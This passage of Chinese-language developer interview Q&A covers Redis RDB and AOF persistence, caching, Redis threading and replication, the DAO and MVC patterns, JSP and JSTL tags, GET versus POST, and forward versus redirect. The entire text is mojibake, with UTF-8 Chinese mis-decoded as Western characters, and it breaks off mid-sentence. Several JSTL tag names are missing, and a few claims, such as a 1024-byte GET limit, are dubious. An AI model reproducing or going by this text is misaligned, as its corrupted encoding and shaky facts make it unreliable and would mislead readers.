æŒä¹…åŒ–è®°å½•æœåŠ¡å™¨æ‰§è¡Œçš„æ‰€æœ‰å†™æ“ä½œå‘½ä»¤ï¼Œå¹¶åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œé€šè¿‡é‡æ–°æ‰§è¡Œè¿™äº›å‘½ä»¤æ¥è¿˜åŸæ•°æ®é›†ã€‚ AOF æ–‡ä»¶ä¸­çš„å‘½ä»¤å…¨éƒ¨ä»¥ Redis åè®®çš„æ ¼å¼æ¥ä¿å­˜ï¼Œæ–°å‘½ä»¤ä¼šè¢«è¿½åŠ åˆ°æ–‡ä»¶çš„æœ«å°¾ã€‚ Redis è¿˜å¯ä»¥åœ¨åå°å¯¹ AOF æ–‡ä»¶è¿›è¡Œé‡å†™ï¼ˆrewriteï¼‰ï¼Œä½¿å¾— AOF æ–‡ä»¶çš„ä½“ç§¯ä¸ä¼šè¶…å‡ºä¿å­˜æ•°æ®é›†çŠ¶æ€æ‰€éœ€çš„å®é™…å¤§å°ã€‚Redis è¿˜å¯ä»¥åŒæ—¶ä½¿ç”¨ AOF æŒä¹…åŒ–å’Œ RDB æŒä¹…åŒ–ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ å½“ Redis é‡å¯æ—¶ï¼Œ å®ƒä¼šä¼˜å…ˆä½¿ç”¨ AOF æ–‡ä»¶æ¥è¿˜åŸæ•°æ®é›†ï¼Œ å› ä¸º AOF æ–‡ä»¶ä¿å­˜çš„æ•°æ®é›†é€šå¸¸æ¯” RDB æ–‡ä»¶æ‰€ä¿å­˜çš„æ•°æ®é›†æ›´å®Œæ•´ã€‚ä½ ç”šè‡³å¯ä»¥å…³é—­æŒä¹…åŒ–åŠŸèƒ½ï¼Œè®©æ•°æ®åªåœ¨æœåŠ¡å™¨è¿è¡Œæ—¶å­˜åœ¨ã€‚ RDB çš„ä¼˜ç‚¹: RDB æ˜¯ä¸€ä¸ªéå¸¸ç´§å‡‘ï¼ˆcompactï¼‰çš„æ–‡ä»¶ï¼Œå®ƒä¿å­˜äº† Redis åœ¨æŸä¸ªæ—¶é—´ç‚¹ä¸Šçš„æ•°æ®é›†ã€‚ è¿™ç§æ–‡ä»¶éå¸¸é€‚åˆç”¨äºè¿›è¡Œå¤‡ä»½ï¼š æ¯”å¦‚è¯´ï¼Œä½ å¯ä»¥åœ¨æœ€è¿‘çš„ 24 å°æ—¶å†…ï¼Œæ¯å°æ—¶å¤‡ä»½ä¸€æ¬¡ RDB æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªæœˆçš„æ¯ä¸€å¤©ï¼Œä¹Ÿå¤‡ä»½ä¸€ä¸ª RDB æ–‡ä»¶ã€‚ è¿™æ ·çš„è¯ï¼Œå³ä½¿é‡ä¸Šé—®é¢˜ï¼Œä¹Ÿå¯ä»¥éšæ—¶å°†æ•°æ®é›†è¿˜åŸåˆ°ä¸åŒçš„ç‰ˆæœ¬ã€‚RDB éå¸¸é€‚ç”¨äºç¾éš¾æ¢å¤ï¼ˆdisaster recoveryï¼‰ï¼šå®ƒåªæœ‰ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å†…å®¹éƒ½éå¸¸ç´§å‡‘ï¼Œå¯ä»¥ï¼ˆåœ¨åŠ å¯†åï¼‰å°†å®ƒä¼ é€åˆ°åˆ«çš„æ•°æ®ä¸­å¿ƒï¼Œæˆ–è€…äºšé©¬é€Š S3 ä¸­ã€‚RDB å¯ä»¥æœ€å¤§åŒ– Redis çš„æ€§èƒ½ï¼šçˆ¶è¿›ç¨‹åœ¨ä¿å­˜ RDB æ–‡ä»¶æ—¶å”¯ä¸€è¦åšçš„å°±æ˜¯ fork å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œç„¶åè¿™ä¸ªå­è¿›ç¨‹å°±ä¼šå¤„ç†æ¥ä¸‹æ¥çš„æ‰€æœ‰ä¿å­˜å·¥ä½œï¼Œçˆ¶è¿›ç¨‹æ— é¡»æ‰§è¡Œä»»ä½•ç£ç›˜ I/O æ“ä½œã€‚RDB åœ¨æ¢å¤å¤§æ•°æ®é›†æ—¶çš„é€Ÿåº¦æ¯” AOF çš„æ¢å¤é€Ÿåº¦è¦å¿«ã€‚ RDB çš„ç¼ºç‚¹: å¦‚æœä½ éœ€è¦å°½é‡é¿å…åœ¨æœåŠ¡å™¨æ•…éšœæ—¶ä¸¢å¤±æ•°æ®ï¼Œé‚£ä¹ˆ RDB ä¸é€‚åˆä½ ã€‚ è™½ç„¶ Redis å…è®¸ä½ è®¾ç½®ä¸åŒçš„ä¿å­˜ç‚¹ï¼ˆsave pointï¼‰æ¥æ§åˆ¶ä¿å­˜ RDB æ–‡ä»¶çš„é¢‘ç‡ï¼Œ ä½†æ˜¯ï¼Œ å› ä¸ºRDB æ–‡ä»¶éœ€è¦ä¿å­˜æ•´ä¸ªæ•°æ®é›†çš„çŠ¶æ€ï¼Œ æ‰€ä»¥å®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªè½»æ¾çš„æ“ä½œã€‚ å› æ­¤ä½ å¯èƒ½ä¼šè‡³å°‘ 5 åˆ†é’Ÿæ‰ä¿å­˜ä¸€æ¬¡ RDB æ–‡ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ ä¸€æ—¦å‘ç”Ÿæ•…éšœåœæœºï¼Œ ä½ å°±å¯èƒ½ä¼šä¸¢å¤±å¥½å‡ åˆ†é’Ÿçš„æ•°æ®ã€‚æ¯æ¬¡ä¿å­˜ RDB çš„æ—¶å€™ï¼ŒRedis éƒ½è¦ fork() å‡ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œå¹¶ç”±å­è¿›ç¨‹æ¥è¿›è¡Œå®é™…çš„æŒä¹…åŒ–å·¥ä½œã€‚ åœ¨æ•°æ®é›†æ¯”è¾ƒåºå¤§æ—¶ï¼Œ fork() å¯èƒ½ä¼šéå¸¸è€—æ—¶ï¼Œé€ æˆæœåŠ¡å™¨åœ¨æŸæŸæ¯«ç§’å†…åœæ­¢å¤„ç†å®¢æˆ·ç«¯ï¼› å¦‚æœæ•°æ®é›†éå¸¸å·¨å¤§ï¼Œå¹¶ä¸” CPU æ—¶é—´éå¸¸ç´§å¼ çš„è¯ï¼Œé‚£ä¹ˆè¿™ç§åœæ­¢æ—¶é—´ç”šè‡³å¯èƒ½ä¼šé•¿è¾¾æ•´æ•´ä¸€ç§’ã€‚ è™½ç„¶ AOF é‡å†™ä¹Ÿéœ€è¦è¿›è¡Œ fork() ï¼Œä½†æ— è®º AOF é‡å†™çš„æ‰§è¡Œé—´éš”æœ‰å¤šé•¿ï¼Œæ•°æ®çš„è€ä¹…æ€§éƒ½ä¸ä¼šæœ‰ä»»ä½•æŸå¤±ã€‚ AOF çš„ä¼˜ç‚¹: ä½¿ç”¨ AOF æŒä¹…åŒ–ä¼šè®© Redis å˜å¾—éå¸¸è€ä¹…ï¼ˆmuch more durableï¼‰ï¼šä½ å¯ä»¥è®¾ç½®ä¸åŒçš„ fsync ç­–ç•¥ï¼Œæ¯”å¦‚æ—  fsync ï¼Œæ¯ç§’é’Ÿä¸€æ¬¡ fsync ï¼Œæˆ–è€…æ¯æ¬¡æ‰§è¡Œå†™å…¥å‘½ä»¤æ—¶ fsync ã€‚ AOF çš„é»˜è®¤ç­–ç•¥ä¸ºæ¯ç§’é’Ÿ fsync ä¸€æ¬¡ï¼Œåœ¨è¿™ç§é…ç½®ä¸‹ï¼ŒRedis ä»ç„¶å¯ä»¥ä¿æŒè‰¯å¥½çš„æ€§èƒ½ï¼Œå¹¶ä¸”å°±ç®—å‘ç”Ÿæ•…éšœåœæœºï¼Œä¹Ÿæœ€å¤šåªä¼šä¸¢å¤±ä¸€ç§’é’Ÿçš„æ•°æ®ï¼ˆ fsync ä¼šåœ¨åå°çº¿ç¨‹æ‰§è¡Œï¼Œæ‰€ä»¥ä¸»çº¿ç¨‹å¯ä»¥ç»§ç»­åŠªåŠ›åœ°å¤„ç†å‘½ä»¤è¯·æ±‚ï¼‰ã€‚AOF æ–‡ä»¶æ˜¯ä¸€ä¸ªåªè¿›è¡Œè¿½åŠ æ“ä½œçš„æ—¥å¿—æ–‡ä»¶ï¼ˆappend only logï¼‰ï¼Œ å› æ­¤å¯¹ AOF æ–‡ä»¶çš„å†™å…¥ä¸éœ€è¦è¿›è¡Œ seek ï¼Œ å³ä½¿æ—¥å¿—å› ä¸ºæŸäº›åŸå› è€ŒåŒ…å«äº†æœªå†™å…¥å®Œæ•´çš„å‘½ä»¤ï¼ˆæ¯”å¦‚å†™å…¥æ—¶ç£ç›˜å·²æ»¡ï¼Œå†™å…¥ä¸­é€”åœæœºï¼Œç­‰ç­‰ï¼‰ï¼Œ redis-check-aof å·¥å…·ä¹Ÿå¯ä»¥è½»æ˜“åœ°ä¿®å¤è¿™ç§é—®é¢˜ã€‚ Redis å¯ä»¥åœ¨ AOF æ–‡ä»¶ä½“ç§¯å˜å¾—è¿‡å¤§æ—¶ï¼Œè‡ªåŠ¨åœ°åœ¨åå°å¯¹ AOF è¿›è¡Œé‡å†™ï¼š é‡å†™åçš„æ–° AOF æ–‡ä»¶åŒ…å«äº†æ¢å¤å½“å‰æ•°æ®é›†æ‰€éœ€çš„æœ€å°å‘½ä»¤é›†åˆã€‚ æ•´ä¸ªé‡å†™æ“ä½œæ˜¯ç»å¯¹å®‰å…¨çš„ï¼Œå› ä¸º Redis åœ¨åˆ›å»ºæ–° AOF æ–‡ä»¶çš„è¿‡ç¨‹ä¸­ï¼Œä¼šç»§ç»­å°†å‘½ä»¤è¿½åŠ åˆ°ç°æœ‰çš„ AOF æ–‡ä»¶é‡Œé¢ï¼Œå³ä½¿é‡å†™è¿‡ç¨‹ä¸­å‘ç”Ÿåœæœºï¼Œç°æœ‰çš„ AOF æ–‡ä»¶ä¹Ÿä¸ä¼šä¸¢å¤±ã€‚ è€Œä¸€æ—¦æ–° AOF æ–‡ä»¶åˆ›å»ºå®Œæ¯•ï¼ŒRedis å°±ä¼šä»æ—§ AOF æ–‡ä»¶åˆ‡æ¢åˆ°æ–° AOF æ–‡ä»¶ï¼Œå¹¶å¼€å§‹å¯¹æ–° AOF æ–‡ä»¶è¿›è¡Œè¿½åŠ æ“ä½œã€‚AOF æ–‡ä»¶æœ‰åºåœ°ä¿å­˜äº†å¯¹æ•°æ®åº“æ‰§è¡Œçš„æ‰€æœ‰å†™å…¥æ“ä½œï¼Œ è¿™äº›å†™å…¥æ“ä½œä»¥ Redis åè®®çš„æ ¼å¼ä¿å­˜ï¼Œ å› æ­¤ AOF æ–‡ä»¶çš„å†…å®¹éå¸¸å®¹æ˜“è¢«äººè¯»æ‡‚ï¼Œ å¯¹æ–‡ä»¶è¿›è¡Œåˆ†æï¼ˆparseï¼‰ä¹Ÿå¾ˆè½»æ¾ã€‚ å¯¼å‡ºï¼ˆexportï¼‰ AOF æ–‡ä»¶ä¹Ÿéå¸¸ç®€å•ï¼š ä¸¾ä¸ªä¾‹å­ï¼Œ å¦‚æœä½ ä¸å°å¿ƒæ‰§è¡Œäº† FLUSHALL å‘½ä»¤ï¼Œ ä½†åªè¦ AOF æ–‡ä»¶æœªè¢«é‡å†™ï¼Œ é‚£ä¹ˆåªè¦åœæ­¢æœåŠ¡å™¨ï¼Œ ç§»é™¤ AOF æ–‡ä»¶æœ«å°¾çš„ FLUSHALL å‘½ä»¤ï¼Œ å¹¶é‡å¯ Redis ï¼Œ å°±å¯ä»¥å°†æ•°æ®é›†æ¢å¤åˆ° FLUSHALL æ‰§è¡Œä¹‹å‰çš„çŠ¶æ€ã€‚ AOF çš„ç¼ºç‚¹: å¯¹äºç›¸åŒçš„æ•°æ®é›†æ¥è¯´ï¼ŒAOF æ–‡ä»¶çš„ä½“ç§¯é€šå¸¸è¦å¤§äº RDB æ–‡ä»¶çš„ä½“ç§¯ã€‚æ ¹æ®æ‰€ä½¿ç”¨çš„ fsync ç­–ç•¥ï¼ŒAOF çš„é€Ÿåº¦å¯èƒ½ä¼šæ…¢äº RDB ã€‚ åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ æ¯ç§’ fsync çš„æ€§èƒ½ä¾ç„¶éå¸¸é«˜ï¼Œ è€Œå…³é—­ fsync å¯ä»¥è®© AOF çš„é€Ÿåº¦å’Œ RDB ä¸€æ ·å¿«ï¼Œ å³ä½¿åœ¨é«˜è´Ÿè·ä¹‹ä¸‹ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ ä¸è¿‡åœ¨å¤„ç†å·¨å¤§çš„å†™å…¥è½½å…¥æ—¶ï¼ŒRDB å¯ä»¥æä¾›æ›´æœ‰ä¿è¯çš„æœ€å¤§å»¶è¿Ÿæ—¶é—´ï¼ˆlatencyï¼‰ã€‚AOF åœ¨è¿‡å»æ›¾ç»å‘ç”Ÿè¿‡è¿™æ ·çš„ bug ï¼š å› ä¸ºä¸ªåˆ«å‘½ä»¤çš„åŸå› ï¼Œå¯¼è‡´ AOF æ–‡ä»¶åœ¨é‡æ–°è½½å…¥æ—¶ï¼Œæ— æ³•å°†æ•°æ®é›†æ¢å¤æˆä¿å­˜æ—¶çš„åŸæ ·ã€‚ ï¼ˆä¸¾ä¸ªä¾‹å­ï¼Œé˜»å¡å‘½ä»¤ BRPOPLPUSH å°±æ›¾ç»å¼•èµ·è¿‡è¿™æ ·çš„ bug ã€‚ï¼‰ æµ‹è¯•å¥—ä»¶é‡Œä¸ºè¿™ç§æƒ…å†µæ·»åŠ äº†æµ‹è¯•ï¼š å®ƒä»¬ä¼šè‡ªåŠ¨ç”Ÿæˆéšæœºçš„ã€å¤æ‚çš„æ•°æ®é›†ï¼Œ å¹¶é€šè¿‡é‡æ–°è½½å…¥è¿™äº›æ•°æ®æ¥ç¡®ä¿ä¸€åˆ‡æ­£å¸¸ã€‚ è™½ç„¶è¿™ç§ bug åœ¨ AOF æ–‡ä»¶ä¸­å¹¶ä¸å¸¸è§ï¼Œ ä½†æ˜¯å¯¹æ¯”æ¥è¯´ï¼Œ RDB å‡ ä¹æ˜¯ä¸å¯èƒ½å‡ºç°è¿™ç§ bug çš„ã€‚ ç¼“å­˜çš„ä¼˜ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ ä¼˜ç‚¹ï¼š 1ã€å‡å°‘äº†å¯¹æ•°æ®åº“çš„è¯»æ“ä½œï¼Œæ•°æ®åº“çš„å‹åŠ›é™ä½ 2ã€åŠ å¿«äº†å“åº”é€Ÿåº¦ redisä¸ºä»€ä¹ˆæ˜¯å•çº¿ç¨‹ï¼Ÿ å› ä¸ºCPUä¸æ˜¯Redisçš„ç“¶é¢ˆã€‚Redisçš„ç“¶é¢ˆæœ€æœ‰å¯èƒ½æ˜¯æœºå™¨å†…å­˜æˆ–è€…ç½‘ç»œå¸¦å®½ã€‚æ—¢ç„¶å•çº¿ç¨‹å®¹æ˜“å®ç°ï¼Œè€Œä¸”CPUä¸ä¼šæˆä¸ºç“¶é¢ˆï¼Œé‚£å°±é¡ºç†æˆç« åœ°é‡‡ç”¨å•çº¿ç¨‹çš„æ–¹æ¡ˆäº†ã€‚ç¼ºç‚¹ï¼šæœåŠ¡å™¨å…¶ä»–æ ¸é—²ç½®ã€‚ ä¸ºä»€ä¹ˆ redis è¯»å†™é€Ÿç‡å¿«ã€æ€§èƒ½å¥½ï¼ŸRedisæ˜¯çº¯å†…å­˜æ•°æ®åº“ï¼Œç›¸å¯¹äºè¯»å†™ç£ç›˜ï¼Œè¯»å†™å†…å­˜çš„é€Ÿåº¦å°±ä¸æ˜¯å‡ å€å‡ åå€äº†ï¼Œä¸€èˆ¬ï¼ŒhashæŸ¥æ‰¾å¯ä»¥è¾¾åˆ°æ¯ç§’ç™¾ä¸‡æ¬¡çš„æ•°é‡çº§ã€‚ å¤šè·¯å¤ç”¨IOï¼Œâ€œå¤šè·¯â€æŒ‡çš„æ˜¯å¤šä¸ªç½‘ç»œè¿æ¥ï¼Œâ€œå¤ç”¨â€æŒ‡çš„æ˜¯å¤ç”¨åŒä¸€ä¸ªçº¿ç¨‹ã€‚é‡‡ç”¨å¤šè·¯ I/O å¤ç”¨æŠ€æœ¯å¯ä»¥è®©å•ä¸ªçº¿ç¨‹é«˜æ•ˆçš„å¤„ç†å¤šä¸ªè¿æ¥è¯·æ±‚ï¼ˆå°½é‡å‡å°‘ç½‘ç»œIOçš„æ—¶é—´æ¶ˆè€—ï¼‰ã€‚å¯ä»¥ç›´æ¥ç†è§£ä¸ºï¼šå•çº¿ç¨‹çš„åŸå­æ“ä½œï¼Œé¿å…ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ—¶é—´å’Œæ€§èƒ½æ¶ˆè€—ï¼›åŠ ä¸Šå¯¹å†…å­˜ä¸­æ•°æ®çš„å¤„ç†é€Ÿåº¦ï¼Œå¾ˆè‡ªç„¶çš„æé«˜redisçš„ååé‡ã€‚ redisçš„ä¸»ä»å¤åˆ¶æ€ä¹ˆåšçš„ï¼Ÿç¬¬ä¸€é˜¶æ®µï¼šä¸masterå»ºç«‹è¿æ¥ ç¬¬äºŒé˜¶æ®µï¼šå‘masterå‘èµ·åŒæ­¥è¯·æ±‚ï¼ˆSYNCï¼‰ ç¬¬ä¸‰é˜¶æ®µï¼šæ¥å—masterå‘æ¥çš„RDBæ•°æ® ç¬¬å››é˜¶æ®µï¼šè½½å…¥RDBæ–‡ä»¶ ä»€ä¹ˆæ˜¯DAOæ¨¡å¼ï¼ŸDAOï¼ˆData Access Objectï¼‰é¡¾åæ€ä¹‰æ˜¯ä¸€ä¸ªä¸ºæ•°æ®åº“æˆ–å…¶ä»–æŒä¹…åŒ–æœºåˆ¶æä¾›äº†æŠ½è±¡æ¥å£çš„å¯¹è±¡ï¼Œåœ¨ä¸æš´éœ²åº•å±‚æŒä¹…åŒ–æ–¹æ¡ˆå®ç°ç»†èŠ‚çš„å‰æä¸‹æä¾›äº†å„ç§æ•°æ®è®¿é—®æ“ä½œã€‚åœ¨å®é™…çš„å¼€å‘ä¸­ï¼Œåº”è¯¥å°†æ‰€æœ‰å¯¹æ•°æ®æºçš„è®¿é—®æ“ä½œè¿›è¡ŒæŠ½è±¡åŒ–åå°è£…åœ¨ä¸€ä¸ªå…¬å…±APIä¸­ã€‚ç”¨ç¨‹åºè®¾è®¡è¯­è¨€æ¥è¯´ï¼Œå°±æ˜¯å»ºç«‹ä¸€ä¸ªæ¥å£ï¼Œæ¥å£ä¸­å®šä¹‰äº†æ­¤åº”ç”¨ç¨‹åºä¸­å°†ä¼šç”¨åˆ°çš„æ‰€æœ‰äº‹åŠ¡æ–¹æ³•ã€‚åœ¨è¿™ä¸ªåº”ç”¨ç¨‹åºä¸­ï¼Œå½“éœ€è¦å’Œæ•°æ®æºè¿›è¡Œäº¤äº’çš„æ—¶å€™åˆ™ä½¿ç”¨è¿™ä¸ªæ¥å£ï¼Œå¹¶ä¸”ç¼–å†™ä¸€ä¸ªå•ç‹¬çš„ç±»æ¥å®ç°è¿™ä¸ªæ¥å£ï¼Œåœ¨é€»è¾‘ä¸Šè¯¥ç±»å¯¹åº”ä¸€ä¸ªç‰¹å®šçš„æ•°æ®å­˜å‚¨ã€‚DAOæ¨¡å¼å®é™…ä¸ŠåŒ…å«äº†ä¸¤ä¸ªæ¨¡å¼ï¼Œä¸€æ˜¯Data Accessorï¼ˆæ•°æ®è®¿é—®å™¨ï¼‰ï¼ŒäºŒæ˜¯Data Objectï¼ˆæ•°æ®å¯¹è±¡ï¼‰ï¼Œå‰è€…è¦è§£å†³å¦‚ä½•è®¿é—®æ•°æ®çš„é—®é¢˜ï¼Œè€Œåè€…è¦è§£å†³çš„æ˜¯å¦‚ä½•ç”¨å¯¹è±¡å°è£…æ•°æ®ã€‚ MVCçš„å„ä¸ªéƒ¨åˆ†éƒ½æœ‰é‚£äº›æŠ€æœ¯æ¥å®ç°?å¦‚ä½•å®ç°?MVC æ˜¯Modelï¼Viewï¼Controllerçš„ç®€å†™ã€‚ â€Modelâ€ ä»£è¡¨çš„æ˜¯åº”ç”¨çš„ä¸šåŠ¡é€»è¾‘ï¼ˆé€šè¿‡JavaBeanï¼ŒEJBç»„ä»¶å®ç°ï¼‰ï¼Œ â€œViewâ€ æ˜¯åº”ç”¨çš„è¡¨ç¤ºé¢ï¼Œç”¨äºä¸ç”¨æˆ·çš„äº¤äº’ï¼ˆç”±JSPé¡µé¢äº§ç”Ÿï¼‰ï¼Œ â€Controllerâ€ æ˜¯æä¾›åº”ç”¨çš„å¤„ç†è¿‡ç¨‹æ§åˆ¶ï¼ˆä¸€èˆ¬æ˜¯ä¸€ä¸ªServletï¼‰ï¼Œé€šè¿‡è¿™ç§è®¾è®¡æ¨¡å‹æŠŠåº”ç”¨é€»è¾‘ï¼Œå¤„ç†è¿‡ç¨‹å’Œæ˜¾ç¤ºé€»è¾‘åˆ†æˆä¸åŒçš„ç»„ä»¶å®ç°ã€‚è¿™äº›ç»„ä»¶å¯ä»¥è¿›è¡Œäº¤äº’å’Œé‡ç”¨ã€‚modelå±‚å®ç°ç³»ç»Ÿä¸­çš„ä¸šåŠ¡é€»è¾‘ï¼Œviewå±‚ç”¨äºä¸ç”¨æˆ·çš„äº¤äº’ï¼Œcontrollerå±‚æ˜¯modelä¸viewä¹‹é—´æ²Ÿé€šçš„æ¡¥æ¢ï¼Œå¯ä»¥åˆ†æ´¾ç”¨æˆ·çš„è¯·æ±‚å¹¶é€‰æ‹©æ°å½“çš„è§†å›¾ä»¥ç”¨äºæ˜¾ç¤ºï¼ŒåŒæ—¶å®ƒä¹Ÿå¯ä»¥è§£é‡Šç”¨æˆ·çš„è¾“å…¥å¹¶å°†å®ƒä»¬æ˜ å°„ä¸ºæ¨¡å‹å±‚å¯æ‰§è¡Œçš„æ“ä½œã€‚ ä½¿ç”¨æ ‡ç­¾åº“æœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿå¦‚ä½•è‡ªå®šä¹‰JSPæ ‡ç­¾ï¼Ÿä½¿ç”¨æ ‡ç­¾åº“çš„å¥½å¤„åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š- åˆ†ç¦»JSPé¡µé¢çš„å†…å®¹å’Œé€»è¾‘ï¼Œç®€åŒ–äº†Webå¼€å‘ï¼›- å¼€å‘è€…å¯ä»¥åˆ›å»ºè‡ªå®šä¹‰æ ‡ç­¾æ¥å°è£…ä¸šåŠ¡é€»è¾‘å’Œæ˜¾ç¤ºé€»è¾‘ï¼›- æ ‡ç­¾å…·æœ‰å¾ˆå¥½çš„å¯ç§»æ¤æ€§ã€å¯ç»´æŠ¤æ€§å’Œå¯é‡ç”¨æ€§ï¼›- é¿å…äº†å¯¹Scriptletï¼ˆå°è„šæœ¬ï¼‰çš„ä½¿ç”¨ï¼ˆå¾ˆå¤šå…¬å¸çš„é¡¹ç›®å¼€å‘éƒ½ä¸å…è®¸åœ¨JSPä¸­ä¹¦å†™å°è„šæœ¬ï¼‰ ç¼–å†™ä¸€ä¸ªJavaç±»å®ç°å®ç°Tag/BodyTag/IterationTagæ¥å£ï¼ˆå¼€å‘ä¸­é€šå¸¸ä¸ç›´æ¥å®ç°è¿™äº›æ¥å£è€Œæ˜¯ç»§æ‰¿TagSupport/BodyTagSupport/SimpleTagSupportç±»ï¼Œè¿™æ˜¯å¯¹ç¼ºçœé€‚é…æ¨¡å¼çš„åº”ç”¨ï¼‰ï¼Œé‡å†™doStartTag()ã€doEndTag()ç­‰æ–¹æ³•ï¼Œå®šä¹‰æ ‡ç­¾è¦å®Œæˆçš„åŠŸèƒ½ï¼š- ç¼–å†™æ‰©å±•åä¸ºtldçš„æ ‡ç­¾æè¿°æ–‡ä»¶å¯¹è‡ªå®šä¹‰æ ‡ç­¾è¿›è¡Œéƒ¨ç½²ï¼Œtldæ–‡ä»¶é€šå¸¸æ”¾åœ¨WEB-INFæ–‡ä»¶å¤¹ä¸‹æˆ–å…¶å­ç›®å½•ä¸­- åœ¨JSPé¡µé¢ä¸­ä½¿ç”¨taglibæŒ‡ä»¤å¼•ç”¨è¯¥æ ‡ç­¾åº“ è¯´è¯´ä½ åšè¿‡çš„é¡¹ç›®ä¸­ï¼Œä½¿ç”¨è¿‡å“ªäº›JSTLæ ‡ç­¾ï¼Ÿé¡¹ç›®ä¸­ä¸»è¦ä½¿ç”¨äº†JSTLçš„æ ¸å¿ƒæ ‡ç­¾åº“ï¼ŒåŒ…æ‹¬ã€ã€ã€ã€ç­‰ï¼Œä¸»è¦ç”¨äºæ„é€ å¾ªç¯å’Œåˆ†æ”¯ç»“æ„ä»¥æ§åˆ¶æ˜¾ç¤ºé€»è¾‘ã€‚ è™½ç„¶JSTLæ ‡ç­¾åº“æä¾›äº†coreã€sqlã€fmtã€xmlç­‰æ ‡ç­¾åº“ï¼Œä½†æ˜¯å®é™…å¼€å‘ä¸­å»ºè®®åªä½¿ç”¨æ ¸å¿ƒæ ‡ç­¾åº“ï¼ˆcoreï¼‰ï¼Œè€Œä¸”æœ€å¥½åªä½¿ç”¨åˆ†æ”¯å’Œå¾ªç¯æ ‡ç­¾å¹¶è¾…ä»¥è¡¨è¾¾å¼è¯­è¨€ï¼ˆELï¼‰ï¼Œè¿™æ ·æ‰èƒ½çœŸæ­£åšåˆ°æ•°æ®æ˜¾ç¤ºå’Œä¸šåŠ¡é€»è¾‘çš„åˆ†ç¦»ï¼Œè¿™æ‰æ˜¯æœ€ä½³å®è·µã€‚ è¯´è¯´ä½ å¯¹getå’Œpostè¯·æ±‚ï¼Œå¹¶ä¸”è¯´è¯´å®ƒä»¬ä¹‹é—´çš„åŒºåˆ«ï¼Ÿâ‘ getè¯·æ±‚ç”¨æ¥ä»æœåŠ¡å™¨ä¸Šè·å¾—èµ„æºï¼Œè€Œpostæ˜¯ç”¨æ¥å‘æœåŠ¡å™¨æäº¤æ•°æ®ï¼›â‘¡getå°†è¡¨å•ä¸­æ•°æ®æŒ‰ç…§name=valueçš„å½¢å¼ï¼Œæ·»åŠ åˆ°action æ‰€æŒ‡å‘çš„URL åé¢ï¼Œå¹¶ä¸”ä¸¤è€…ä½¿ç”¨â€?â€è¿æ¥ï¼Œè€Œå„ä¸ªå˜é‡ä¹‹é—´ä½¿ç”¨â€&amp;â€è¿æ¥ï¼›postæ˜¯å°†è¡¨å•ä¸­çš„æ•°æ®æ”¾åœ¨HTTPåè®®çš„è¯·æ±‚å¤´æˆ–æ¶ˆæ¯ä½“ä¸­ï¼Œä¼ é€’åˆ°actionæ‰€æŒ‡å‘URLï¼›â‘¢getä¼ è¾“çš„æ•°æ®è¦å—åˆ°URLé•¿åº¦é™åˆ¶ï¼ˆ1024å­—èŠ‚ï¼‰ï¼›è€Œpostå¯ä»¥ä¼ è¾“å¤§é‡çš„æ•°æ®ï¼Œä¸Šä¼ æ–‡ä»¶é€šå¸¸è¦ä½¿ç”¨postæ–¹å¼ï¼›â‘£ä½¿ç”¨getæ—¶å‚æ•°ä¼šæ˜¾ç¤ºåœ¨åœ°å€æ ä¸Šï¼Œå¦‚æœè¿™äº›æ•°æ®ä¸æ˜¯æ•æ„Ÿæ•°æ®ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨getï¼›å¯¹äºæ•æ„Ÿæ•°æ®è¿˜æ˜¯åº”ç”¨ä½¿ç”¨postï¼›â‘¤getä½¿ç”¨MIMEç±»å‹application/x-www-form-urlencodedçš„URLç¼–ç ï¼ˆä¹Ÿå«ç™¾åˆ†å·ç¼–ç ï¼‰æ–‡æœ¬çš„æ ¼å¼ä¼ é€’å‚æ•°ï¼Œä¿è¯è¢«ä¼ é€çš„å‚æ•°ç”±éµå¾ªè§„èŒƒçš„æ–‡æœ¬ç»„æˆï¼Œä¾‹å¦‚ä¸€ä¸ªç©ºæ ¼çš„ç¼–ç æ˜¯â€%20â€ã€‚ è½¬å‘å’Œé‡å®šå‘ ä¹‹é—´çš„åŒºåˆ«ï¼Ÿforwardæ˜¯å®¹å™¨ä¸­æ§åˆ¶æƒçš„è½¬å‘ï¼Œæ˜¯æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ŒæœåŠ¡å™¨ç›´æ¥è®¿é—®ç›®æ ‡åœ°å€çš„URLï¼ŒæŠŠé‚£ä¸ªURL çš„å“åº”å†…å®¹è¯»å–è¿‡æ¥ï¼Œç„¶åæŠŠè¿™äº›å†…å®¹å†å‘ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æ ¹æœ¬ä¸çŸ¥é“æœåŠ¡å™¨å‘é€çš„å†…å®¹æ˜¯ä»å“ªå„¿æ¥çš„ï¼Œæ‰€ä»¥å®ƒçš„åœ°å€æ ä¸­è¿˜æ˜¯åŸæ¥çš„åœ°å€ã€‚redirectå°±æ˜¯æœåŠ¡å™¨ç«¯æ ¹æ®é€»è¾‘ï¼Œå‘é€ä¸€ä¸ªçŠ¶æ€ç ï¼Œå‘Šè¯‰æµè§ˆå™¨é‡æ–°å»è¯·æ±‚é‚£ä¸ªåœ°å€ï¼Œå› æ­¤ä»æµè§ˆå™¨çš„åœ°å€æ ä¸­å¯ä»¥çœ‹åˆ°è·³è½¬åçš„é“¾æ¥åœ°å€ï¼Œå¾ˆæ˜æ˜¾redirectæ— æ³•è®¿é—®åˆ°æœåŠ¡å™¨ä¿æŠ¤èµ·æ¥èµ„æºï¼Œä½†æ˜¯å¯ä»¥ä»ä¸€ä¸ªç½‘ç«™redirectåˆ°å…¶ä»–ç½‘ç«™ã€‚forwardæ›´åŠ 